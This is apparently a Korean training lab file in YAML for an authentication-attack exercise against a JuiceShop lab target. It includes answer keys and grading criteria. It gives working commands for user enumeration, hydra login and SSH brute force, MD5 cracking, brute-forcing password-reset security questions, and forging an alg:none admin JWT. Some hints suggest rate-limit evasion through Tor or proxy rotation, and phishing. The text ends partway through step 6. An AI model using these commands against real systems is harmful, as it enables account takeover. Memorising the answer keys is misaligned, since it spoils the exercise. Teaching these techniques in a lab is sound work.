lab_id: attack-nonai-week05
title: 인증 공격 (Authentication Attacks)
version: non-ai
course: attack-nonai
week: 5
description: 비밀번호 브루트포스, 딕셔너리 공격, 크리덴셜 스터핑, JWT 조작 등 인증 메커니즘을 공격하는 기법을 실습한다. hydra,
  john, hashcat 등의 도구를 활용한다.
difficulty: medium
duration_minutes: 120
objectives:
- 온라인/오프라인 비밀번호 크래킹의 원리와 차이를 이해한다
- hydra를 사용한 웹 로그인 브루트포스를 수행할 수 있다
- JWT 토큰의 구조를 분석하고 약점을 공격할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라.
  hint: |
    curl로 API를 호출하고 python3으로 이메일만 추출한다.

    📎 도구 우선순위 (힌트):
    1) 우선 사용: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt
    2) 미설치 시: sudo apt install -y curl python3
    3) 실패/대안 (사용자 열거):
       - curl -s ... | jq -r '.data[].email' > /tmp/users.txt (jq 더 간결, sudo apt install -y jq)
       - http GET ... | jq -r '.data[].email'
       - Burp Intruder Sniper: ID brute → email enum
       - ffuf -u .../api/Users/FUZZ -w numbers.txt -mc 200 | grep email
       - Postman Runner + iteration
       - theHarvester -d juice-sh.op (외부 OSINT)
       - hunter.io / RocketReach (외부 email DB)
    4) 후속: /tmp/users.txt → hydra/medusa/credential stuffing wordlist.
    5) 검증: @ 키워드 (이메일 포맷). CWE-204 Observable Response Discrepancy.
  category: recon
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    [print(u[''email'']) for u in json.load(sys.stdin)[''data'']]" > /tmp/users.txt
    && cat /tmp/users.txt'
  answer_detail: 공격 대상 사용자 목록을 확보하는 것은 인증 공격의 첫 단계이다. API에서 사용자 정보가 노출되면 유효한 이메일/사용자명을
    수집하여 브루트포스 공격의 효율을 높일 수 있다.
  verify:
    type: output_contains
    expect: '@'
    field: stdout
    semantic:
      intent: 사용자 이메일 열거 — curl /api/Users | python3 email 추출 → /tmp/users.txt. API
        노출로 유효 사용자명 수집. 브루트포스 효율 상승. CWE-204 Observable Response Discrepancy 대체.
      success_criteria:
      - '@ 키워드 (이메일 포맷)'
      - curl /api/Users + python email 추출
      - /tmp/users.txt 저장
      acceptable_methods:
      - "curl + python email (수기 baseline): /api/Users + json.load + email 추출 → /tmp/users.txt."
      - "curl + jq -r '.data[].email': 더 간결."
      - "httpie GET + jq."
      - "Burp Intruder Sniper: ID brute."
      - "ffuf ID enum + grep."
      - "Postman Runner."
      - "theHarvester: 외부 OSINT."
      - "hunter.io / RocketReach: email DB."
      - "Bastion AI 자동 enum + 검증: 다중 endpoint 동시."
      negative_signs:
      - /api/Users 없음
      - 이메일 추출 없음
      - 사용자 열거 맥락 없음
  target_vm: attacker
- order: 2
  instruction: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
    계정을 대상으로 하라.
  hint: |
    for 루프와 curl을 조합하여 여러 비밀번호를 시도한다.

    📎 도구 우선순위 (힌트):
    1) 우선: for pw in ...; do curl -X POST /rest/user/login ...; done
    2) 미설치 시: sudo apt install -y curl python3
    3) 실패/대안 (자동화 도구별):
       - hydra http-post-form: hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 10.20.30.80 http-post-form '/rest/user/login:email=^USER^&password=^PASS^:F=Invalid' -t 1
       - Burp Intruder Sniper (P 위치 1개 brute)
       - Burp Intruder Cluster Bomb (user × pass)
       - ncrack -p 3000 (HTTP form)
       - patator http_fuzz (Python)
       - medusa -h 10.20.30.80 -U users.txt -P pass.txt -M http
    4) 검증: SUCCESS/FAIL + authentication 키 (token 반환).
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
    $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')"; done'
  answer_detail: 수동 브루트포스는 스크립팅을 통해 반복 로그인을 시도하는 기법이다. 실전에서는 계정 잠금, CAPTCHA, rate
    limiting 등의 방어 메커니즘이 있어 자동화 도구가 필요하다.
  verify:
    type: output_contains
    expect:
    - Trying
    - authentication
    field: stdout
    semantic:
      intent: 수동 브루트포스 — for pw in admin/admin123/password/12345/admin1234 + curl
        -X POST /rest/user/login + SUCCESS/FAIL. 일반 비밀번호 목록 수동 시도. 방어 메커니즘 (계정 잠금/CAPTCHA/rate
        limiting) 부재 확인.
      success_criteria:
      - Trying 키워드
      - for 루프 + 5개 이상 비밀번호
      - SUCCESS/FAIL 판정
      acceptable_methods:
      - "for + curl + 판정 (수기 baseline): 5개 이상 비밀번호 + SUCCESS/FAIL."
      - "hydra http-post-form: 자동화 표준."
      - "Burp Intruder Sniper / Cluster Bomb."
      - "ncrack: nmap team."
      - "patator: Python."
      - "medusa: 빠른 thread."
      - "wfuzz: HTTP form fuzzer."
      - "Python requests + concurrent.futures: 자동화."
      - "Bastion AI brute force orchestrator: rate limit detection + 자동 throttle."
      negative_signs:
      - 비밀번호 3개 이하
      - SUCCESS/FAIL 판정 없음
      - 방어 부재 맥락 없음
  target_vm: attacker
- order: 3
  instruction: hydra를 사용하여 SSH 서비스({{WEB_IP}}:22)에 대한 비밀번호 브루트포스를 시도하라. 사용자는 web,
    비밀번호 사전은 /usr/share/wordlists/rockyou.txt의 상위 100개를 사용하라.
  hint: |
    hydra -l 사용자 -P 사전파일 ssh://타겟 형태로 실행한다.

    📎 도구 우선순위 (힌트):
    1) 우선: hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
    2) 미설치 시: sudo apt install -y hydra
    3) 실패/대안 (SSH brute 도구별):
       - medusa -h 10.20.30.80 -u web -P top100.txt -M ssh -t 4 (빠른 병렬)
       - ncrack -p 22 --user web -P top100.txt 10.20.30.80 (nmap team)
       - patator ssh_login host=10.20.30.80 user=web password=FILE0 0=top100.txt
       - msfconsole > use auxiliary/scanner/ssh/ssh_login (Metasploit)
       - sudo nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=top100.txt 10.20.30.80
       - sshdump (legacy)
       - CrackMapExec ssh: cme ssh 10.20.30.80 -u web -p top100.txt
    4) 주의: SSH rate limiting (fail2ban / sshd MaxAuthTries) → -t 1 + -W 5 (느린 시도) 권장.
    5) 검증: hydra 키워드 + login + password 발견 라인. T1110.001.
  category: exploit
  points: 10
  answer: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
  answer_detail: hydra는 다양한 프로토콜(SSH, HTTP, FTP, SMB 등)에 대한 온라인 브루트포스 도구이다. -t 옵션으로
    동시 스레드 수를 제어하고, -f 옵션으로 첫 성공 시 중단한다. SSH는 기본적으로 rate limiting이 있어 느리다.
  verify:
    type: output_contains
    expect: hydra
    field: stdout
    semantic:
      intent: hydra SSH 브루트포스 — head -100 rockyou.txt + hydra -l web -P /tmp/top100.txt
        ssh://10.20.30.80 -t 4 -f. 동시 4 스레드 + 첫 성공 시 중단. SSH rate limiting 존재. MITRE
        ATT&CK T1110.001.
      success_criteria:
      - hydra 키워드
      - hydra -l -P -t + ssh://
      - -f 조기 종료
      acceptable_methods:
      - "hydra (수기 baseline): -l user -P wordlist ssh:// -t 4 -f."
      - "medusa -M ssh: 병렬."
      - "ncrack -p 22: nmap team."
      - "patator ssh_login: Python."
      - "Metasploit ssh_login."
      - "nmap --script ssh-brute."
      - "CrackMapExec ssh: AD lateral."
      - "Python paramiko + 사전: 자동화."
      - "fail2ban 우회: -t 1 + -W 5 + IP rotation (Tor/proxy)."
      negative_signs:
      - hydra 옵션 없음
      - wordlist 없음
      - T1110 맥락 없음
  target_vm: attacker
- order: 4
  instruction: John the Ripper를 사용하여 MD5 해시를 크래킹하라. 먼저 echo -n 'admin123' | md5sum으로
    해시를 생성하고, john으로 복원하라.
  hint: |
    해시를 파일에 저장하고 john --format=raw-md5로 크래킹한다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
    2) 미설치 시: sudo apt install -y john wordlists
    3) 실패/대안 (해시 크래킹 도구별):
       - hashcat -m 0 /tmp/hash.txt rockyou.txt (GPU 가속, 100배 빠름)
       - hashcat -m 0 -a 3 ?a?a?a?a?a?a?a (mask brute)
       - hashcat -m 0 -a 6 wordlist.txt ?d?d (hybrid)
       - CrackStation web (https://crackstation.net, 15B+ pre-computed)
       - hashes.com (online, 무료)
       - PassGAN / OMEN (ML 기반 password guessing)
       - rainbow tables (RainbowCrack)
    4) 후속: john --show /tmp/hash.txt (결과 표시).
    5) 검증: admin123 복원 → MD5 취약 (CWE-916).
  category: exploit
  points: 10
  answer: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5
    --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>/dev/null; john --format=raw-md5
    --show /tmp/hash.txt
  answer_detail: 오프라인 비밀번호 크래킹은 해시 값을 확보한 후 원문을 복원하는 기법이다. MD5는 더 이상 안전하지 않은 해시 알고리즘으로,
    rainbow table이나 사전 공격으로 빠르게 크래킹된다.
  verify:
    type: output_contains
    expect:
    - admin123
    - john
    field: stdout
    semantic:
      intent: John MD5 크래킹 — echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt
        + john --format=raw-md5 --wordlist=rockyou.txt + --show. 오프라인 사전 공격. MD5 rainbow
        table 취약 (CWE-916).
      success_criteria:
      - admin123 키워드 (복원 성공)
      - john --format=raw-md5 --wordlist
      - --show 결과 확인
      acceptable_methods:
      - "john --format=raw-md5 (수기 baseline): wordlist 사전 공격 + --show 결과."
      - "hashcat -m 0: GPU 100배 빠름."
      - "hashcat -a 3 mask brute: ?a?l?u?d?s."
      - "hashcat -a 6 hybrid: wordlist + mask."
      - "CrackStation web: 15B+ pre-computed."
      - "hashes.com: online 무료."
      - "PassGAN / OMEN: ML password guessing."
      - "rainbow tables (RainbowCrack)."
      - "Bastion AI 자동 hash type detection + 도구 선택."
      negative_signs:
      - john/hashcat 없음
      - raw-md5 포맷 없음
      - MD5 취약성 맥락 없음
  target_vm: attacker
- order: 5
  instruction: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를
    시도하라. admin@juice-sh.op 계정을 대상으로 하라.
  hint: |
    보안 질문의 답변을 추측하여 비밀번호를 재설정한다.

    📎 도구 우선순위 (힌트):
    1) 우선: for ans in ...; do curl -X POST /rest/user/reset-password ...; done
    2) 미설치 시: sudo apt install -y curl
    3) 실패/대안 (보안 질문 brute):
       - Burp Intruder Sniper + answer 위치 + custom wordlist
       - hydra http-post-form (answer 파라미터)
       - 사전 생성: cewl https://target -m 5 -w custom.txt (회사 사이트 키워드)
       - OSINT 기반: theHarvester + 직원 SNS (어머니 결혼 전 성/첫 학교/애완동물)
       - cupp -i (Common User Passwords Profiler, 개인 정보 기반)
       - PayloadAllTheThings/Account Takeover
    4) 검증: Wrong/Success 응답 차이. timing 분석 (정확 답변 시 느림).
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo
    -n "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
    -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
    | head -c 100; echo; done'
  answer_detail: 보안 질문 기반 비밀번호 재설정은 추측 가능한 답변으로 인해 취약하다. OSINT로 수집한 정보(SNS, 블로그 등)를
    활용하면 보안 질문의 답변을 추측할 수 있다.
  verify:
    type: output_contains
    expect:
    - 'Answer:'
    - Wrong
    field: stdout
    semantic:
      intent: 보안 질문 답변 브루트포스 — for ans in 'replicator'/'Mr. Robot'/'Jim'/'Samuel'
        + curl -X POST /rest/user/reset-password + answer 추측. OSINT 활용 답변 추론. OWASP
        인증 재설정 취약점.
      success_criteria:
      - 'Answer: 키워드'
      - for + 4개 이상 답변 추측
      - reset-password 엔드포인트
      acceptable_methods:
      - "for + curl + answer (수기 baseline): 4 답변 추측."
      - "Burp Intruder Sniper + custom wordlist."
      - "hydra http-post-form (answer)."
      - "cewl: 사이트 키워드 wordlist."
      - "theHarvester + 직원 SNS OSINT."
      - "cupp -i: 개인 정보 기반."
      - "PayloadAllTheThings Account Takeover."
      - "사회공학: phishing 후 직접 답변."
      - "timing oracle: 정확 답변 시 느림."
      negative_signs:
      - 답변 2개 이하
      - reset-password 없음
      - OSINT 맥락 없음
  target_vm: attacker
- order: 6
  instruction: JWT 토큰의 알고리즘을 'none'으로 변경하여 서명 검증을 우회하라. python3으로 조작된 JWT를 생성하라.
  hint: |
    JWT header의 alg를 none으로 변경하고 signature 부분을 제거한다.

    📎 도구 우선순위 (힌트):
    1) 우선: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode(); ..."
    2) 미설치 시: sudo apt install -y python3
    3) 실패/대안 (JWT 변조 도구):
       - jwt_tool.py -t URL -tT (Tampering test, GitHub ticarpi/jwt_tool)
       - jwt_tool --mode e -P (alg confusion attack)
       - Burp JWT Editor extension (시각 + 변조 + 서명)
       - jwt.io (web, 시각, signature 자동)
       - PyJWT: jwt.encode({...}, '', algorithm='none')
       - Java: jose4j with 'none'
    4) 추가 공격: alg=HS256 → RS256 변환 (public key 를 HMAC secret 으로), kid header injection.
    5) 검증: alg=none + signature 빈 문자열 (.으로 끝). CVE-2015-2951 계열. CWE-347.
  category: exploit
  points: 15
  answer: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode();
    p=base64.urlsafe_b64encode(json.dumps({'status':'success','data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'iat':1700000000}).encode()).rstrip(b'=').decode();
    print(f'{h}.{p}.')"
  answer_detail: JWT의 'none' 알고리즘 공격은 서버가 알고리즘 필드를 클라이언트에서 받아들일 때 가능하다. alg:none으로
    설정하면 서명 검증이 생략되어 페이로드를 자유롭게 조작할 수 있다. 현대 JWT 라이브러리는 이를 차단한다.
  verify:
    type: output_contains
    expect: none
    field: stdout
    semantic:
      intent: JWT alg:none 공격 — python3 + header alg:none + payload role:admin + signature
        제거 + base64 URL-safe + 종결 '.'. 서버가 알고리즘 클라이언트 신뢰 시 서명 검증 우회. CVE-2015-2951
        계열.
      success_criteria:
      - none 키워드 (JWT 생성)
      - alg:none header
      - signature 비움 (.으로 끝)
      acceptable_methods:
      - "python base64 + JSON (수기 baseline): alg:none + signature 비움."
      - "jwt_tool.py -tT: tampering test."
      - "jwt_tool --mode e -P: alg confusion."
      - "Burp JWT Editor: 시각 변조."
